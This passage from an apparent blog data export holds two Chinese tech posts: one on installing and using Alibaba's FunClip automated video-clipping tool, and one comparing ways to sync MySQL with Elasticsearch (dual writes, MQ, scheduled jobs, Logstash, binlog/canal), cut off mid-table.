工具\n---\n\n\n这几年短视频非常火爆，尤其是抖音等短视频平台的崛起，很多人都可以把自己的日常生活或者工作发到网上，吸引很多人的关注，也有一些人因此赚到了人生第一桶金。\n\n然后剪辑视频却是一件非常耗费精力的事情，经常要几个小时才能剪出来一个视频。\n\n今天给大家推荐一个阿里开源的自动化视频剪辑工具—FunClip，可以帮助大家轻松剪辑视频。\n\nFunClip是一款完全开源的自动化视频剪辑工具，可以安装在我们自己的电脑上，支持离线使用。还可以通过调用阿里巴巴通义实验室开源的 FunASR Paraformer 系列模型进行视频的语音识别，然后我们可以自由选择识别结果中的文本片段或说话人，点击裁剪按钮即可获取对应片段的视频。\n\n所以使用 **FunClip** 剪辑视频非常的简单，不用像传统的视频剪辑软件，需要我们手动自己分割视频。\n\n在上述基本功能的基础上，FunClip有以下特色：\n\n*   FunClip融合了众多高级语言模型的调用机制，并开放了灵活的prompt设置功能，旨在探索利用大型语言模型进行视频编辑的新方法。\n\n*   FunClip采用了阿里巴巴开源的顶尖工业级语音识别模型——Paraformer-Large，它在开源中文ASR模型中表现出色，Modelscope的下载次数已超过1300万次，同时能够精确地预测出时间戳。\n\n*   此外，FunClip还整合了SeACo-Paraformer的热词定制功能，在语音识别过程中可以特别指定实体词、人名等作为热词，从而显著提高识别的准确性。\n\n*   FunClip还配备了CAM++的说话人识别模型，用户可以利用自动识别出的说话人ID作为编辑的依据，轻松裁剪出特定说话人的部分。\n\n*   通过Gradio的交互界面，用户可以轻松实现上述功能，安装过程简洁，操作便捷，并且支持在服务器端部署，通过网页进行操作。\n\n*   FunClip还支持多段视频的自由编辑，并且能够自动生成完整的视频SRT字幕文件以及目标剪辑片段的SRT字幕，简化了整个编辑流程。\n\n\n而且FunClip还加入了大语言模型智能裁剪功能，集成了qwen系列，gpt系列等模型，提供默认prompt，我们也可以训练自己的prompt，还支持通过FunASR开源的SeACo-Paraformer模型在视频剪辑中进一步支持热词定制化。\n\n![](./2024/06/16/最强阿里自动化视频剪辑工具/1.png)\n\n  **安装🔨**\n----------\n\n**![图片](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/NoProb.png?tp=webp&wxfrom=5&wx_lazy=1&wx_co=1) 安装python环境**\n\n\nFunClip的运行仅依赖python环境，所以我们只需要搭建好python环境就OK了。\n\n```\n# 克隆funclip仓库\ngit clone https://github.com/alibaba-damo-academy/FunClip.git\ncd FunClip\n# 安装相关Python依赖\npip install -r ./requirements.txt\n```\n\n![图片](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/LetMeSee.png?tp=webp&wxfrom=5&wx_lazy=1&wx_co=1) 安装 imagemagick\n\n\n希望使用自动生成字幕的视频裁剪功能，那么需要安装imagemagick：\n\n\n\n*   Ubuntu\n    \n\n```\napt-get -y update && apt-get -y install ffmpeg imagemagick\nsed -i 's/none/read,write/g' /etc/ImageMagick-6/policy.xml\n```\n\n*   MacOS\n    \n\n```\nbrew install imagemagick\nsed -i 's/none/read,write/g' /usr/local/Cellar/imagemagick/7.1.1-8_1/etc/ImageMagick-7/policy.xml\n```\n\n*   Windows\n    \n\n\n\n\n需要从下面的地址下载并安装imagemagick：\n\n```\nhttps://imagemagick.org/script/download.php#windows\n```\n\n\n\n\n  **使用FunClip**\n\n首先使用下面的命令启动FunClip：\n\n```\npython funclip/launch.py\n```\n\n随后在浏览器中访问localhost:7860 就能进入首页。\n\n然后按如下步骤即可进行视频剪辑：\n\n\n\n*   上传你的视频（或使用下方的视频用例）\n    \n*   设置热词，设置文件输出路径（保存识别结果、视频等）\n    \n*   点击识别按钮获取识别结果，或点击识别+区分说话人在语音识别基础上识别说话人ID\n    \n*   将识别结果中的选段复制到对应位置，或者将说话人ID输入到对应为止\n    \n*   配置剪辑参数，偏移量与字幕设置等\n    \n*   点击“裁剪”或“裁剪+字幕”按钮\n\n\n\n\n\n![](./2024/06/16/最强阿里自动化视频剪辑工具/2.png)\n使用大语言模型裁剪请参考如下教程：\n\n![](./2024/06/16/最强阿里自动化视频剪辑工具/3.png)\nFunClip 在魔塔社区部署了在线服务，可以通过下面的地址体验：\n\nhttps://modelscope.cn/studios/iic/funasr\\_app\\_clipvideo/summary\n\n我们可以上传自己的视频或者音频，也可以使用 FunClip 提供的demo：\n\n![](./2024/06/16/最强阿里自动化视频剪辑工具/4.png)\n更多内容，可以到github了解：\n\nhttps://github.com/alibaba-damo-academy/FunClip\n\n总的来说，FunClip是一款完全开源、本地部署的自动化视频剪辑工具，可以帮助我们更加轻松地剪辑视频，记录我们的美好生活。","slug":"最强阿里自动化视频剪辑工具","published":1,"updated":"2024-06-16T05:11:04.135Z","comments":1,"layout":"post","photos":[],"_id":"clylh1ryt002ebsuh7l4i8ue4","content":"<p>这几年短视频非常火爆，尤其是抖音等短视频平台的崛起，很多人都可以把自己的日常生活或者工作发到网上，吸引很多人的关注，也有一些人因此赚到了人生第一桶金。</p>\n<p>然后剪辑视频却是一件非常耗费精力的事情，经常要几个小时才能剪出来一个视频。</p>\n<p>今天给大家推荐一个阿里开源的自动化视频剪辑工具—FunClip，可以帮助大家轻松剪辑视频。</p>\n<p>FunClip是一款完全开源的自动化视频剪辑工具，可以安装在我们自己的电脑上，支持离线使用。还可以通过调用阿里巴巴通义实验室开源的 FunASR Paraformer 系列模型进行视频的语音识别，然后我们可以自由选择识别结果中的文本片段或说话人，点击裁剪按钮即可获取对应片段的视频。</p>\n<p>所以使用 <strong>FunClip</strong> 剪辑视频非常的简单，不用像传统的视频剪辑软件，需要我们手动自己分割视频。</p>\n<p>在上述基本功能的基础上，FunClip有以下特色：</p>\n<ul>\n<li><p>FunClip融合了众多高级语言模型的调用机制，并开放了灵活的prompt设置功能，旨在探索利用大型语言模型进行视频编辑的新方法。</p>\n</li>\n<li><p>FunClip采用了阿里巴巴开源的顶尖工业级语音识别模型——Paraformer-Large，它在开源中文ASR模型中表现出色，Modelscope的下载次数已超过1300万次，同时能够精确地预测出时间戳。</p>\n</li>\n<li><p>此外，FunClip还整合了SeACo-Paraformer的热词定制功能，在语音识别过程中可以特别指定实体词、人名等作为热词，从而显著提高识别的准确性。</p>\n</li>\n<li><p>FunClip还配备了CAM++的说话人识别模型，用户可以利用自动识别出的说话人ID作为编辑的依据，轻松裁剪出特定说话人的部分。</p>\n</li>\n<li><p>通过Gradio的交互界面，用户可以轻松实现上述功能，安装过程简洁，操作便捷，并且支持在服务器端部署，通过网页进行操作。</p>\n</li>\n<li><p>FunClip还支持多段视频的自由编辑，并且能够自动生成完整的视频SRT字幕文件以及目标剪辑片段的SRT字幕，简化了整个编辑流程。</p>\n</li>\n</ul>\n<p>而且FunClip还加入了大语言模型智能裁剪功能，集成了qwen系列，gpt系列等模型，提供默认prompt，我们也可以训练自己的prompt，还支持通过FunASR开源的SeACo-Paraformer模型在视频剪辑中进一步支持热词定制化。</p>\n<p><img src=\"/./2024/06/16/%E6%9C%80%E5%BC%BA%E9%98%BF%E9%87%8C%E8%87%AA%E5%8A%A8%E5%8C%96%E8%A7%86%E9%A2%91%E5%89%AA%E8%BE%91%E5%B7%A5%E5%85%B7/1.png\"></p>\n<h2 id=\"安装🔨\"><a href=\"#安装🔨\" class=\"headerlink\" title=\"  安装🔨\"></a>  <strong>安装🔨</strong></h2><p><strong><img src=\"https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/NoProb.png?tp=webp&wxfrom=5&wx_lazy=1&wx_co=1\" alt=\"图片\"> 安装python环境</strong></p>\n<p>FunClip的运行仅依赖python环境，所以我们只需要搭建好python环境就OK了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 克隆funclip仓库</span><br><span class=\"line\">git clone https://github.com/alibaba-damo-academy/FunClip.git</span><br><span class=\"line\">cd FunClip</span><br><span class=\"line\"># 安装相关Python依赖</span><br><span class=\"line\">pip install -r ./requirements.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/LetMeSee.png?tp=webp&wxfrom=5&wx_lazy=1&wx_co=1\" alt=\"图片\"> 安装 imagemagick</p>\n<p>希望使用自动生成字幕的视频裁剪功能，那么需要安装imagemagick：</p>\n<ul>\n<li>Ubuntu</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt-get -y update &amp;&amp; apt-get -y install ffmpeg imagemagick</span><br><span class=\"line\">sed -i &#x27;s/none/read,write/g&#x27; /etc/ImageMagick-6/policy.xml</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>MacOS</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">brew install imagemagick</span><br><span class=\"line\">sed -i &#x27;s/none/read,write/g&#x27; /usr/local/Cellar/imagemagick/7.1.1-8_1/etc/ImageMagick-7/policy.xml</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Windows</li>\n</ul>\n<p>需要从下面的地址下载并安装imagemagick：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://imagemagick.org/script/download.php#windows</span><br></pre></td></tr></table></figure>\n\n\n\n\n<p>  <strong>使用FunClip</strong></p>\n<p>首先使用下面的命令启动FunClip：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python funclip/launch.py</span><br></pre></td></tr></table></figure>\n\n<p>随后在浏览器中访问localhost:7860 就能进入首页。</p>\n<p>然后按如下步骤即可进行视频剪辑：</p>\n<ul>\n<li><p>上传你的视频（或使用下方的视频用例）</p>\n</li>\n<li><p>设置热词，设置文件输出路径（保存识别结果、视频等）</p>\n</li>\n<li><p>点击识别按钮获取识别结果，或点击识别+区分说话人在语音识别基础上识别说话人ID</p>\n</li>\n<li><p>将识别结果中的选段复制到对应位置，或者将说话人ID输入到对应为止</p>\n</li>\n<li><p>配置剪辑参数，偏移量与字幕设置等</p>\n</li>\n<li><p>点击“裁剪”或“裁剪+字幕”按钮</p>\n</li>\n</ul>\n<p><img src=\"/./2024/06/16/%E6%9C%80%E5%BC%BA%E9%98%BF%E9%87%8C%E8%87%AA%E5%8A%A8%E5%8C%96%E8%A7%86%E9%A2%91%E5%89%AA%E8%BE%91%E5%B7%A5%E5%85%B7/2.png\"><br>使用大语言模型裁剪请参考如下教程：</p>\n<p><img src=\"/./2024/06/16/%E6%9C%80%E5%BC%BA%E9%98%BF%E9%87%8C%E8%87%AA%E5%8A%A8%E5%8C%96%E8%A7%86%E9%A2%91%E5%89%AA%E8%BE%91%E5%B7%A5%E5%85%B7/3.png\"><br>FunClip 在魔塔社区部署了在线服务，可以通过下面的地址体验：</p>\n<p><a href=\"https://modelscope.cn/studios/iic/funasr/_app/_clipvideo/summary\">https://modelscope.cn/studios/iic/funasr\\_app\\_clipvideo/summary</a></p>\n<p>我们可以上传自己的视频或者音频，也可以使用 FunClip 提供的demo：</p>\n<p><img src=\"/./2024/06/16/%E6%9C%80%E5%BC%BA%E9%98%BF%E9%87%8C%E8%87%AA%E5%8A%A8%E5%8C%96%E8%A7%86%E9%A2%91%E5%89%AA%E8%BE%91%E5%B7%A5%E5%85%B7/4.png\"><br>更多内容，可以到github了解：</p>\n<p><a href=\"https://github.com/alibaba-damo-academy/FunClip\">https://github.com/alibaba-damo-academy/FunClip</a></p>\n<p>总的来说，FunClip是一款完全开源、本地部署的自动化视频剪辑工具，可以帮助我们更加轻松地剪辑视频，记录我们的美好生活。</p>\n","cover":"/img/haibian.png","cover_type":"img","excerpt":"","more":"<p>这几年短视频非常火爆，尤其是抖音等短视频平台的崛起，很多人都可以把自己的日常生活或者工作发到网上，吸引很多人的关注，也有一些人因此赚到了人生第一桶金。</p>\n<p>然后剪辑视频却是一件非常耗费精力的事情，经常要几个小时才能剪出来一个视频。</p>\n<p>今天给大家推荐一个阿里开源的自动化视频剪辑工具—FunClip，可以帮助大家轻松剪辑视频。</p>\n<p>FunClip是一款完全开源的自动化视频剪辑工具，可以安装在我们自己的电脑上，支持离线使用。还可以通过调用阿里巴巴通义实验室开源的 FunASR Paraformer 系列模型进行视频的语音识别，然后我们可以自由选择识别结果中的文本片段或说话人，点击裁剪按钮即可获取对应片段的视频。</p>\n<p>所以使用 <strong>FunClip</strong> 剪辑视频非常的简单，不用像传统的视频剪辑软件，需要我们手动自己分割视频。</p>\n<p>在上述基本功能的基础上，FunClip有以下特色：</p>\n<ul>\n<li><p>FunClip融合了众多高级语言模型的调用机制，并开放了灵活的prompt设置功能，旨在探索利用大型语言模型进行视频编辑的新方法。</p>\n</li>\n<li><p>FunClip采用了阿里巴巴开源的顶尖工业级语音识别模型——Paraformer-Large，它在开源中文ASR模型中表现出色，Modelscope的下载次数已超过1300万次，同时能够精确地预测出时间戳。</p>\n</li>\n<li><p>此外，FunClip还整合了SeACo-Paraformer的热词定制功能，在语音识别过程中可以特别指定实体词、人名等作为热词，从而显著提高识别的准确性。</p>\n</li>\n<li><p>FunClip还配备了CAM++的说话人识别模型，用户可以利用自动识别出的说话人ID作为编辑的依据，轻松裁剪出特定说话人的部分。</p>\n</li>\n<li><p>通过Gradio的交互界面，用户可以轻松实现上述功能，安装过程简洁，操作便捷，并且支持在服务器端部署，通过网页进行操作。</p>\n</li>\n<li><p>FunClip还支持多段视频的自由编辑，并且能够自动生成完整的视频SRT字幕文件以及目标剪辑片段的SRT字幕，简化了整个编辑流程。</p>\n</li>\n</ul>\n<p>而且FunClip还加入了大语言模型智能裁剪功能，集成了qwen系列，gpt系列等模型，提供默认prompt，我们也可以训练自己的prompt，还支持通过FunASR开源的SeACo-Paraformer模型在视频剪辑中进一步支持热词定制化。</p>\n<p><img src=\"/./2024/06/16/%E6%9C%80%E5%BC%BA%E9%98%BF%E9%87%8C%E8%87%AA%E5%8A%A8%E5%8C%96%E8%A7%86%E9%A2%91%E5%89%AA%E8%BE%91%E5%B7%A5%E5%85%B7/1.png\"></p>\n<h2 id=\"安装🔨\"><a href=\"#安装🔨\" class=\"headerlink\" title=\"  安装🔨\"></a>  <strong>安装🔨</strong></h2><p><strong><img src=\"https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/NoProb.png?tp=webp&wxfrom=5&wx_lazy=1&wx_co=1\" alt=\"图片\"> 安装python环境</strong></p>\n<p>FunClip的运行仅依赖python环境，所以我们只需要搭建好python环境就OK了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 克隆funclip仓库</span><br><span class=\"line\">git clone https://github.com/alibaba-damo-academy/FunClip.git</span><br><span class=\"line\">cd FunClip</span><br><span class=\"line\"># 安装相关Python依赖</span><br><span class=\"line\">pip install -r ./requirements.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/LetMeSee.png?tp=webp&wxfrom=5&wx_lazy=1&wx_co=1\" alt=\"图片\"> 安装 imagemagick</p>\n<p>希望使用自动生成字幕的视频裁剪功能，那么需要安装imagemagick：</p>\n<ul>\n<li>Ubuntu</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt-get -y update &amp;&amp; apt-get -y install ffmpeg imagemagick</span><br><span class=\"line\">sed -i &#x27;s/none/read,write/g&#x27; /etc/ImageMagick-6/policy.xml</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>MacOS</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">brew install imagemagick</span><br><span class=\"line\">sed -i &#x27;s/none/read,write/g&#x27; /usr/local/Cellar/imagemagick/7.1.1-8_1/etc/ImageMagick-7/policy.xml</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Windows</li>\n</ul>\n<p>需要从下面的地址下载并安装imagemagick：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://imagemagick.org/script/download.php#windows</span><br></pre></td></tr></table></figure>\n\n\n\n\n<p>  <strong>使用FunClip</strong></p>\n<p>首先使用下面的命令启动FunClip：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python funclip/launch.py</span><br></pre></td></tr></table></figure>\n\n<p>随后在浏览器中访问localhost:7860 就能进入首页。</p>\n<p>然后按如下步骤即可进行视频剪辑：</p>\n<ul>\n<li><p>上传你的视频（或使用下方的视频用例）</p>\n</li>\n<li><p>设置热词，设置文件输出路径（保存识别结果、视频等）</p>\n</li>\n<li><p>点击识别按钮获取识别结果，或点击识别+区分说话人在语音识别基础上识别说话人ID</p>\n</li>\n<li><p>将识别结果中的选段复制到对应位置，或者将说话人ID输入到对应为止</p>\n</li>\n<li><p>配置剪辑参数，偏移量与字幕设置等</p>\n</li>\n<li><p>点击“裁剪”或“裁剪+字幕”按钮</p>\n</li>\n</ul>\n<p><img src=\"/./2024/06/16/%E6%9C%80%E5%BC%BA%E9%98%BF%E9%87%8C%E8%87%AA%E5%8A%A8%E5%8C%96%E8%A7%86%E9%A2%91%E5%89%AA%E8%BE%91%E5%B7%A5%E5%85%B7/2.png\"><br>使用大语言模型裁剪请参考如下教程：</p>\n<p><img src=\"/./2024/06/16/%E6%9C%80%E5%BC%BA%E9%98%BF%E9%87%8C%E8%87%AA%E5%8A%A8%E5%8C%96%E8%A7%86%E9%A2%91%E5%89%AA%E8%BE%91%E5%B7%A5%E5%85%B7/3.png\"><br>FunClip 在魔塔社区部署了在线服务，可以通过下面的地址体验：</p>\n<p><a href=\"https://modelscope.cn/studios/iic/funasr/_app/_clipvideo/summary\">https://modelscope.cn/studios/iic/funasr\\_app\\_clipvideo/summary</a></p>\n<p>我们可以上传自己的视频或者音频，也可以使用 FunClip 提供的demo：</p>\n<p><img src=\"/./2024/06/16/%E6%9C%80%E5%BC%BA%E9%98%BF%E9%87%8C%E8%87%AA%E5%8A%A8%E5%8C%96%E8%A7%86%E9%A2%91%E5%89%AA%E8%BE%91%E5%B7%A5%E5%85%B7/4.png\"><br>更多内容，可以到github了解：</p>\n<p><a href=\"https://github.com/alibaba-damo-academy/FunClip\">https://github.com/alibaba-damo-academy/FunClip</a></p>\n<p>总的来说，FunClip是一款完全开源、本地部署的自动化视频剪辑工具，可以帮助我们更加轻松地剪辑视频，记录我们的美好生活。</p>\n"},{"title":"电商中es和mysql数据同步方案","date":"2024-06-16T05:23:32.000Z","_content":"\n在实际项目开发中，常用Mysql作为业务数据库，ElasticSearch作为查询库。ElasticSearch主要用来应对海量数据的复杂查询，提高查询效率和缓解Mysql数据库的压力。如何实现 MySQL 数据库和ElasticSearch之间的数据同步也是为非常关键的，下面介绍几种常见的数据同步方案方案。\n\n**1、同步双写方案**\n\n![](./2024/06/16/电商中es和mysql数据同步方案/1.png)\n同步双写是指在Mysql上进行数据增删改操作时，同步将数据写入到ElasticSearch中，使用此方式保证Mysql与ElasticSearch中的数据一致性的优/缺点如下：\n\n<table style=\"visibility: visible;\"><tbody style=\"visibility: visible;\"><tr style=\"visibility: visible;\"><td width=\"90\" valign=\"top\" style=\"word-break: break-all; visibility: visible;\">优点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all; visibility: visible;\">实现简单；实时性高</td></tr><tr style=\"visibility: visible;\"><td width=\"90\" valign=\"top\" style=\"word-break: break-all; visibility: visible;\">缺点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all; visibility: visible;\"><p style=\"visibility: visible;\">1、存在数据丢失风险<span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; font-size: var(--articleFontsize); letter-spacing: 0.034em; visibility: visible;\">；</span></p><p><span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;\">2、性能不高；</span></p><p><span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;\"></span><span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;\">3、和业务之间的耦合性强；</span></p><p><span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;\"></span><span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;\">4、不方便做扩展</span></p></td></tr></tbody></table>\n\n\n\n**2、异步写入方案**\n\n![](./2024/06/16/电商中es和mysql数据同步方案/2.png)\n在Mysql上进行数据增删改操作时，通过MQ（如Kafka）异步将数据写入到ElasticSearch中。这种异步方式可以降低Mysql的写入延迟并有效的防止了ElasticSearch自身问题而影响到Mysql数据的写入，但是可能会出现存在Mysql和ElasticSearch数据长时间的不一致的现象。此方案的优缺点如下：\n\n<table width=\"578\"><tbody><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">优点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\">性能高；数据不易丢失；支持多数据源写入<br></td></tr><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">缺点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\"><p>1、增加了系统的复杂度，因为需要接入MQ；</p><p>2、数据之间的同步可能延迟高，MQ消费可能不及时；</p><p>3、发送消息需要硬编码到业务中；</p></td></tr></tbody></table>\n\n\n\n**3、定时任务同步方案**\n\n![](./2024/06/16/电商中es和mysql数据同步方案/3.png)\n定时任务的方案就是设定一个频率去Mysql中拉取数据来同步到ElasticSearch中，但是这个频率如何选择要根据自身的业务特性来选取。当前，如果频率设置很高就给系统造成一定的压力（如CPU、内存使用率居高不下），频率设置很低数据的实时性比较差。此方案的优缺点如下：\n\n<table width=\"578\"><tbody><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">优点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\">实现简单；无额外的代码的侵入业务中<br></td></tr><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">缺点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\"><p>1、实时性差，因为依赖定时任务的执行频率；</p><p>2、给数据库带来一定的压力，因为是不断的轮询数据库；</p></td></tr></tbody></table>\n\n\n\n**4、使用Logstash同步**\n\n![](./2024/06/16/电商中es和mysql数据同步方案/4.png)\n此方案是针对定时任务同步的方案的一种改进，原理是Logstash提供了JDBC插件，它可以定期使用SQL查询数据库并且获取数据变化，然后通过配置来实现Mysql数据同步到ElasticSearch中。Logstash的配置：\n\n```\ninput {`  `jdbc {`    `jdbc_driver_library => \"/path/to/mysql-connector-java-x.x.x-bin.jar\"`    `jdbc_driver_class => \"com.mysql.jdbc.Driver\"`    `jdbc_connection_string => \"jdbc:mysql://192.168.202.12:3306/order\"`    `jdbc_user => \"root\"`    `jdbc_password => \"root123456\"`    `schedule => \"* * * * *\"`    `statement => \"SELECT * FROM order\"`  `}``}` `filter {`  `# 在此处添加任何特定的数据过滤器`  `}` `output {`  `elasticsearch {`    `hosts => [\"192.168.203.21:9200\"]`    `index => \"order\"`    `document_id => \"%{unique_id_field}\"`  `}``}\n```\n\n此方案的优缺点如下：\n\n<table width=\"578\"><tbody><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">优点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\">实现简单；无额外的代码的侵入业务中<br></td></tr><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">缺点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\"><p>1、实时性差，因为Logstash是定期同步数据的；</p><p>2、需要中间件的支持；</p></td></tr></tbody></table>\n\n\n\n**5、使用binlog同步——自建binlog服务中心**\n\n![](./2024/06/16/电商中es和mysql数据同步方案/5.png)\n此方案是先读取Mysql的binlog日志，然后将binlog日志交给binlog中心服务处理，然后把读取的binlog转化成MQ消息，通过消费MQ消息将Mysql中的数据同步到ElasticSearch中。此方案的优缺点如下：\n\n<table width=\"578\"><tbody><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">优点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\">性能高；业务解耦；无额外的代码的侵入业务中<br></td></tr><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">缺点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\"><p>1、构建binlog中心服务复杂；</p><p>2、采用MQ消费binlog也会存在延迟风险；</p></td></tr></tbody></table>\n\n\n\n**6、使用binlog同步——开源中间件**\n\n基于binlog同步的方式，目前有许多的优秀数据迁移工具可以实现，如canal，其实现的原理是binlog订阅的方式，模拟一个Mysql的Slave订阅 binlog日志，然后通过binlog将数据同步到监听者中。\n\n![](./2024/06/16/电商中es和mysql数据同步方案/6.png)\n总结：\n\n数据同步方案有多种，需要根据自身的业务对数据的实时性来选择，业内常用的还是使用binlog的方案实现。","source":"_posts/电商中es和mysql数据同步方案.md","raw":"---\ntitle: 电商中es和mysql数据同步方案\ndate: 2024-06-16 13:23:32\ntags: 场景设计\ncategories: 面试\n---\n\n在实际项目开发中，常用Mysql作为业务数据库，ElasticSearch作为查询库。ElasticSearch主要用来应对海量数据的复杂查询，提高查询效率和缓解Mysql数据库的压力。如何实现 MySQL 数据库和ElasticSearch之间的数据同步也是为非常关键的，下面介绍几种常见的数据同步方案方案。\n\n**1、同步双写方案**\n\n![](./2024/06/16/电商中es和mysql数据同步方案/1.png)\n同步双写是指在Mysql上进行数据增删改操作时，同步将数据写入到ElasticSearch中，使用此方式保证Mysql与ElasticSearch中的数据一致性的优/缺点如下：\n\n<table style=\"visibility: visible;\"><tbody style=\"visibility: visible;\"><tr style=\"visibility: visible;\"><td width=\"90\" valign=\"top\" style=\"word-break: break-all; visibility: visible;\">优点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all; visibility: visible;\">实现简单；实时性高</td></tr><tr style=\"visibility: visible;\"><td width=\"90\" valign=\"top\" style=\"word-break: break-all; visibility: visible;\">缺点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all; visibility: visible;\"><p style=\"visibility: visible;\">1、存在数据丢失风险<span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; font-size: var(--articleFontsize); letter-spacing: 0.034em; visibility: visible;\">；</span></p><p><span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;\">2、性能不高；</span></p><p><span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;\"></span><span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;\">3、和业务之间的耦合性强；</span></p><p><span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;\"></span><span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 